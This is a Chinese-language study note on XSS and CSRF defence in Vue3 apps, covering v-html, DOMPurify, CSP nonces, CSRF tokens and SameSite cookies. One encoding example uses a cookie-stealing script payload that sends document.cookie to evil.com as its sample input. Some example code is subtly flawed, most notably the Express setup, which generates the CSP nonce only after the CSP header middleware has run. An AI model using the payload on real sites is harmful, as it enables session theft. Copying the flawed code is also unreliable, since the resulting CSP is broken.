---
title: Web安全基础（XSS/CSRF）
date: 2026-11-19
updated: 2026-11-19
tags:
  - 前端开发
  - Vue3
  - Web安全
  - XSS
  - CSRF
aliases:
  - Web 安全基础：XSS 与 CSRF
  - XSS/CSRF 防护基础
source: 网络资料整理
---

# Web安全基础（XSS/CSRF）

> [!摘要] 内容与定位
> 本文系统梳理前端最常遇到的两类 Web 安全风险：**XSS（跨站脚本）**与 **CSRF（跨站请求伪造）**。先讲清两类攻击的原理、分类与执行链路，再落到可直接落地的防护手段——输出编码/清理、CSP、CSRF Token、SameSite Cookie、Origin/Referer 校验，并给出可运行的代码与配置示例（含 Vue3 中 `v-html` 的坑与严格 CSP 的配置方法）。它是 [[Vue3与前端-从入门到精通]] 生产实践与安全落地部分的展开，适合已掌握 Vue3 基础、需要把应用做到「可上线、抗攻击」的前端开发者。

## 一、最新动态（截至 2026-11）

- **XSS 与 CSRF 属于稳定的基础安全知识**，其攻击分类与防护原则本身不随框架版本频繁变化，MDN 等官方文档是当前权威口径。本文不涉及版本号预测，具体规范以 [MDN XSS](https://developer.mozilla.org/zh-CN/docs/Web/Security/Attacks/XSS) 与 [MDN CSRF](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF) 为准。
- **Vue 3.5 编译器输出自动生成 TrustedHTML**：3.5 系列（最新稳定版 **3.5.45**，2026-11-05 发布）起，模板编译产物在严格 CSP 环境下能安全工作，降低了手动转义的成本。此事实来自 [vuejs/core CHANGELOG](https://github.com/vuejs/core/blob/main/CHANGELOG.md)。
- **Vue 3.6 处于 RC（`3.6.0-rc.1`，2026-07-17）**，Vapor Mode 功能集已完成、响应式换用 alien-signals；它属于 100% 可选的编译模式，**截至 2026-11 仍未进入稳定版**。安全相关差异（事件委托与 `stopPropagation()` 的交互）在 Vapor 下需特别留意，但不影响本文 XSS/CSRF 的核心结论，详见 [Vue 3.6.0-rc.1 发布说明](https://github.com/vuejs/core/releases/tag/v3.6.0-rc.1)。
- **CSP 规范仍在演进**，非ce/hash 之外的 `report-uri` 等指令逐步被 `report-to` 取代，配置时以 [MDN CSP 实战指南](https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/CSP) 当前版本为准。

## 二、基础概念

### 1. XSS（跨站脚本，Cross-Site Scripting）

攻击者利用网站对用户输入处理不严的缺陷，把**恶意客户端脚本**注入到目标站点，当其他用户浏览该页面时，脚本在其浏览器中执行。因为脚本来自「可信站点」的上下文，可以访问该站点的 Cookie、模拟用户操作、窃取数据，从而冒充用户。

按注入与执行方式，XSS 分为三类：

| 类型 | 注入方式 | 典型场景 |
|------|----------|----------|
| **反射型 XSS** | 用户输入经服务器**未修改直接回显**到响应中 | 搜索框、URL 参数回显、报错页回显 |
| **存储型 XSS** | 恶意脚本被**持久化存储**（数据库、缓存），稍后原样显示给其他用户 | 评论、留言、文章、昵称等可存储内容 |
| **基于 DOM 的 XSS** | 前端脚本不安全地把数据写入 DOM，源码中不经过服务器 | 读取 `location`、`hash`、`document.referrer` 后拼接 DOM |

> [!note] 三者的区别
> 关键看**恶意脚本的来源**：反射型来自「请求参数 → 响应」，存储型来自「站点自身的存储」，DOM 型完全发生在前端，服务器甚至看不到攻击载荷。存储型危害最大，因为一次注入、全员受害。

### 2. CSRF（跨站请求伪造，Cross-Site Request Forgery）

攻击者诱导用户（或其浏览器）从**恶意站点**向**目标站点**发起一个 HTTP 请求。由于浏览器会自动携带目标站点的 Cookie 等凭证，服务器误以为这是用户本人的真实意图，从而执行转账、改密码、改邮箱等有害操作。

CSRF 成立的**必要条件**：目标站点用 Cookie 维持登录态，且服务端**不校验请求是否真正由用户主动发起**。需要区分它与 XSS：XSS 是「攻击者把脚本注入到站点执行」，CSRF 是「攻击者借用浏览器的已登录身份发请求」，二者可叠加（XSS 可用于实施 CSRF）。

## 三、核心机制

### 1. XSS 的执行链路

一次 XSS 攻击的完整链路：**攻击载荷注入 → 页面输出未净化 → 浏览器解析执行 → 窃取凭证/篡改数据**。因此防护的本质是在「输出到 HTML 上下文」这一步做**编码或清理**，并限制脚本的执行来源。

**HTML 上下文中的编码**：把 `<`、`>`、`&`、`"`、`'` 等字符转成 HTML 实体，让浏览器将其当作普通文本而非标签/属性。例如文本 `<script>` 应输出为 `&lt;script&gt;`。**注意编码是上下文相关的**：在 JavaScript 上下文、CSS 上下文、URL 上下文中需要不同的转义规则，混用会导致防护失效。

**Vue 中的风险点**：Vue 默认通过插值 `{{ }}` 输出，会自动做 HTML 转义，因此**默认安全**；但 `v-html` 会把内容按原始 HTML 渲染，**等于主动关闭了转义**，必须确保传入内容已净化：

```vue
<script setup lang="ts">
import { ref } from 'vue'

const rawHtml = ref('<script>alert(1)</script>')

// ❌ 危险：原始 HTML 直接渲染，脚本会被执行
const dangerous = () => rawHtml.value

// ✅ 安全：先经过白名单清理库处理，再交给 v-html
import DOMPurify from 'dompurify'
const cleanHtml = () => DOMPurify.sanitize(rawHtml.value)
</script>

<template>
  <div v-html="cleanHtml()"></div>
</template>
```

### 2. CSP：以白名单限制脚本来源

CSP 通过响应头 `Content-Security-Policy` 声明哪些来源的资源可以加载与执行。针对 XSS，核心是 `script-src`：只允许携带**正确 nonce（随机值）或 hash** 的脚本执行，从而**禁止内联脚本与 `eval()`**，让注入的脚本无法运行。

```http
Content-Security-Policy:
  script-src 'self' 'nonce-a1b2c3d4';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'self';
  upgrade-insecure-requests
```

各指令含义：

- `script-src 'self' 'nonce-a1b2e3d4'`：仅同源脚本 + 带该 nonce 的脚本可执行；
- `object-src 'none'`、`base-uri 'none'`：禁用 `<object>` 等插件与 `<base>` 劫持，减少 XSS 利用面；
- `frame-ancestors 'self'`：防止页面被恶意站点 iframe 嵌套（点击劫持）；
- `upgrade-insecure-requests`：把 http 请求升级为 https，降低中间人风险。

服务器需为每个响应生成**随机 nonce**，并在允许执行的 `<script>` 标签上回写相同值。

### 3. CSRF Token 与 SameSite Cookie

**CSRF Token** 的两种主流实现：

- **同步器模式（Synchronizer Token）**：服务端为用户生成随机 token 存于会话，渲染表单时下发，提交时校验 token 是否与会话一致；
- **双重提交（Double Submit Cookie）**：token 同时放在 Cookie 与请求体/请求头中，服务端校验两者是否一致。

**SameSite Cookie** 是最省心的兜底：

```http
Set-Cookie: session=abc123; Path=/; SameSite=Lax; HttpOnly; Secure
```

- `SameSite=Lax`：跨站**顶层导航**（如点击链接）会携带 Cookie，但跨站的表单提交、子请求不携带，能挡住绝大多数 CSRF，同时保留正常的跳转体验；
- `SameSite=Strict`：跨站请求一律不携带，安全性最高，但可能影响从外部站点跳回时的登录态；
- `HttpOnly` 让脚本无法读取 Cookie，进一步降低 XSS 窃取 Cookie 的风险；`Secure` 保证仅 HTTPS 传输。

**校验 `Origin` / `Referer`**：服务端比对请求头 `Origin`（或 `Referer`）是否为白名单内站点，非白名单直接拒绝。注意 `Referer` 可能因隐私策略缺失，`Origin` 更可靠。

## 四、实践步骤（含代码/命令示例）

### 1. 用 Node 检查一个页面是否存在 DOM 型 XSS 隐患

```bash
# 安装依赖（示例项目）
npm install dompurify

# 本地起一个静态站点后，用 curl 检查响应头是否配置了 CSP
curl -sI http://localhost:5173 | grep -i content-security-policy
# 若没有输出，说明该站点未配置 CSP，需补充
```

### 2. 在 Node 服务端对输出做上下文编码（反射型/存储型）

```javascript
// 简单的 HTML 文本上下文编码，仅用于说明思路
function escapeHtml(input) {
  return String(input)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

const userInput = '<script>fetch("//evil.com?c="+document.cookie)</script>'
console.log(escapeHtml(userInput))
// 输出：&lt;script&gt;fetch(&quot;//evil.com?c=&quot;+document.cookie)&lt;/script&gt;
```

生产中推荐使用成熟库（如 `dompurify`、`js-xss`）做**白名单清理**，而不是自写转义，避免漏掉上下文边界。

### 3. 配置带 nonce 的 CSP（Nginx 示例）

```nginx
# 为每个响应生成随机 nonce（此处用固定值仅为示例，生产应动态生成）
add_header Content-Security-Policy
  "script-src 'self' 'nonce-a1b2c3d4' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'self'"
  always;
```

页面中只有带相同 nonce 的脚本会被执行：

```html
<script nonce="a1b2c3d4">
  // 允许执行
  console.log('ok')
</script>
<script>
  // 无 nonce，被 CSP 拦截，可借此检测注入
  alert(1)
</script>
```

### 4. 在 Vue3 项目接入 CSP 与 CSRF 防护

```bash
# 1. 安装 CSP 相关依赖（示例）
npm install helmet
npm install dompurify
```

```javascript
// Express 服务端示例：配置 CSP 头 + CSRF Token + SameSite Cookie
const express = require('express')
const helmet = require('helmet')
const crypto = require('crypto')

const app = express()

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`],
    objectSrc: ["'none'"],
    baseUri: ["'none'"],
    frameAncestors: ["'self'"],
  },
}))

// 为每个请求生成随机 nonce
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64')
  next()
})

// 登录后下发 SameSite=Lax 的会话 Cookie
app.post('/login', (req, res) => {
  const session = 'session-token-xxx'
  res.cookie('session', session, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    path: '/',
  })
  res.json({ ok: true })
})

// 关键写操作校验 CSRF Token
app.post('/transfer', (req, res) => {
  const { csrfToken } = req.body
  if (csrfToken !== req.session.csrfToken) {
    return res.status(403).json({ error: 'CSRF token invalid' })
  }
  res.json({ ok: true })
})

app.listen(3000)
```

前端提交表单时需带上 token：

```vue
<script setup lang="ts">
import { ref, onMounted } from 'vue'

const csrfToken = ref('')

onMounted(async () => {
  // 从页面/接口获取当前会话的 CSRF Token
  const res = await fetch('/api/csrf-token', { credentials: 'same-origin' })
  const data = await res.json()
  csrfToken.value = data.token
})

async function transfer() {
  await fetch('/transfer', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify({ amount: 100, csrfToken: csrfToken.value }),
  })
}
</script>
```

## 五、最佳实践与常见坑

**XSS 侧**

1. **优先用插值而非 `v-html`**：Vue 的 `{{ }}` 自带转义，`v-html` 是明确的「信任」声明，务必先净化。
2. **编码要匹配上下文**：HTML 文本、属性、JS、CSS、URL 各有转义规则，用通用函数硬套会导致绕过。
3. **不要把校验当编码**：只做「输入白名单校验」而不在**输出**时编码，一旦数据被二次使用（如在别处回显）防护就失效。**输出编码/清理才是最后一道防线**。
4. **CSP 不是可选项**：严格 CSP（nonce/hash + `object-src 'none'` + `base-uri 'none'`）能显著降低 XSS 的实际危害；同时禁止内联脚本与 `eval()`。
5. **CSP 与 TrustedHTML**：Vue 3.5 编译器输出 TrustedHTML，利于严格 CSP，但不要因此放松对 `v-html` 的管理。

**CSRF 侧**

1. **不要只靠隐藏字段或自定义请求头**：这些可被跨站表单或简单脚本绕过，必须用**服务端校验的随机 token**。
2. **`SameSite` 是兜底而非全部**：`Lax`/`Strict` 能挡大多数 CSRF，但对**同站子域**或某些导航场景需配合 token。
3. **`Origin` 校验要注意缺失**：部分浏览器/请求可能不带 `Origin`，需与 `Referer` 及 token 组合使用，避免误伤正常请求。
4. **关键操作加二次验证**：转账、改密码、改邮箱等敏感操作，除 CSRF 防护外，再要求密码/验证码等二次确认。

**常见坑**

| 现象 | 原因 | 处理 |
|------|------|------|
| 页面里脚本被执行 | 输出未编码，或使用 `v-html` 渲染了不可信内容 | 输出编码 + DOMPurify 清理；避免 `v-html` |
| 内联脚本被 CSP 拦截 | CSP 未为内联脚本放行 nonce/hash | 给合法内联脚本加 nonce，或改为外部脚本 |
| 跨站提交被执行 | 缺少 CSRF Token 校验，且 Cookie 未设 `SameSite` | 服务端校验 token，设置 `SameSite=Lax/Strict` |
| 登录态丢失/接口 403 | `SameSite` 设置过严或 `Secure` 在 HTTP 下生效 | 按场景选 `Lax`，生产统一 HTTPS |
| CSP 配置后功能异常 | 白名单漏掉 CDN 等第三方资源 | 用 `report-uri`/`report-to` 收集违规，逐项补白名单 |

## 六、核心要点速查

1. **XSS 三类**：反射型（回显）、存储型（入库后展示）、基于 DOM 的（前端写入 DOM）。
2. **XSS 防护**：输出编码/清理 + 严格 CSP（nonce/hash 的 `script-src`，`object-src 'none'`、`base-uri 'none'`）。
3. **Vue 默认安全**：`{{ }}` 自动转义；`v-html` 会关闭转义，必须净化。
4. **CSRF 本质**：恶意站点借用浏览器的已登录凭证发请求，服务端误以为是用户本意。
5. **CSRF 防护三件套**：CSRF Token（同步器/双重提交）、`SameSite=Lax/Strict`、校验 `Origin`/`Referer`。
6. **Cookie 加固**：`HttpOnly` 防脚本窃取，`Secure` 保证 HTTPS 传输。
7. **敏感操作**：二次验证（密码/验证码）作为纵深防御。
8. **安全是纵深防御**：编码、CSP、Token、Cookie、来源校验多层叠加，任何单点都可能被绕过。

## 七、学习资源

- [MDN · XSS（跨站脚本）](https://developer.mozilla.org/zh-CN/docs/Web/Security/Attacks/XSS)
- [MDN · CSRF（跨站请求伪造）](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF)
- [MDN · CSP 实战实现指南](https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/CSP)
- [OWASP · 跨站脚本（XSS）防护备忘录](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP · CSRF 防护备忘录](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Vue3 与前端总览（本库）](https://github.com/vuejs/core/blob/main/CHANGELOG.md) 见 [[Vue3与前端-从入门到精通]] 中的版本与 TrustedHTML 说明

## 八、关联笔记

- [[Vue3与前端-从入门到精通]] — 本主题的总览，前端工程与 Vue3 体系地图

## 九、变更记录

- 2026-11-19：首次创建。
